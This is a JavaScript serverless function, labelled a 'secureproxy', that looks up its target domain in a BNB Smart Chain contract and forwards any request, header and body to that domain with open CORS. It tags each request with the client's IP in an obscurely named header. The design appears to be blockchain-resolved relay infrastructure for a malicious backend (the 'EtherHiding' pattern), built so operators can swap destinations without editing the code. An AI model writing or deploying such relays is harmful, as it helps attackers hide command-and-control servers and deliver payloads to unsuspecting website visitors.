import fetch from 'node-fetch';

const RPC_URLS = [
  "https://binance.llamarpc.com",
  "https://bsc.drpc.org"
];
const CONTRACT_ADDRESS = "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
const UPDATE_INTERVAL = 60 * 1000; // 60 seconds
let cachedDomain = null;
let lastUpdate = 0;

// === Helper Functions ===
function getClientIP(req) {
  if (req.headers['cf-connecting-ip']) return req.headers['cf-connecting-ip'];
  if (req.headers['x-forwarded-for']) return req.headers['x-forwarded-for'].split(',')[0].trim();
  return req.socket.remoteAddress || '';
}

async function hexToString(hex) {
  hex = hex.replace(/^0x/, '');
  hex = hex.substring(64);
  const lengthHex = hex.substring(0, 64);
  const length = parseInt(lengthHex, 16);
  const dataHex = hex.substring(64, 64 + length * 2);
  let result = '';
  for (let i = 0; i < dataHex.length; i += 2) {
    const charCode = parseInt(dataHex.substring(i, i + 2), 16);
    if (charCode === 0) break;
    result += String.fromCharCode(charCode);
  }
  return result;
}

async function fetchTargetDomain() {
  const data = '20965255';
  for (const rpcUrl of RPC_URLS) {
    try {
      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          id: 1,
          method: 'eth_call',
          params: [{ to: CONTRACT_ADDRESS, data: '0x' + data }, 'latest']
        }),
        timeout: 120000
      });
      const result = await response.json();
      if (!result.error) {
        const domain = await hexToString(result.result);
        if (domain) return domain;
      }
    } catch (err) {
      console.error(`RPC failed: ${rpcUrl}`, err.message);
    }
  }
  throw new Error('Could not fetch target domain');
}

async function getTargetDomain() {
  const now = Date.now();
  if (cachedDomain && now - lastUpdate < UPDATE_INTERVAL) return cachedDomain;
  cachedDomain = await fetchTargetDomain();
  lastUpdate = now;
  return cachedDomain;
}

async function streamToBuffer(stream) {
  const chunks = [];
  for await (const chunk of stream) chunks.push(chunk);
  return Buffer.concat(chunks);
}

// === Vercel Handler ===
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', '*');

  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Max-Age', '86400');
    return res.status(204).end();
  }

  const urlObj = new URL(req.url, `http://${req.headers.host}`);
  let endpoint = urlObj.searchParams.get('e');

  if (!endpoint) endpoint = req.url.replace(/^\/api\/secureproxy\/?/, '');
  if (!endpoint) {
    res.writeHead(400, { 'Content-Type': 'text/plain' });
    return res.end('Missing endpoint');
  }

  if (endpoint === 'ping_proxy') {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    return res.end('pong');
  }

  try {
    const targetDomain = (await getTargetDomain()).replace(/\/$/, '');
    const fullUrl = `${targetDomain}/${endpoint.replace(/^\//, '')}`;

    const clientIP = getClientIP(req);
    const headers = { ...req.headers };
    delete headers.host;
    delete headers.origin;
    delete headers['accept-encoding'];
    delete headers['content-encoding'];
    headers['x-dfkjldifjlifjd'] = clientIP;

    const body = req.method !== 'GET' && req.method !== 'HEAD'
      ? await streamToBuffer(req)
      : undefined;

    const proxyResponse = await fetch(fullUrl, {
      method: req.method,
      headers,
      body,
      timeout: 120000
    });

    const buffer = Buffer.from(await proxyResponse.arrayBuffer());
    res.writeHead(proxyResponse.status, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, HEAD, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*',
      'Content-Type': proxyResponse.headers.get('content-type') || 'application/octet-stream'
    });
    res.end(buffer);
  } catch (err) {
    console.error("Proxy error:", err.message);
    res.writeHead(500, { 'Content-Type': 'text/plain' });
    res.end('error ' + err.message);
  }
}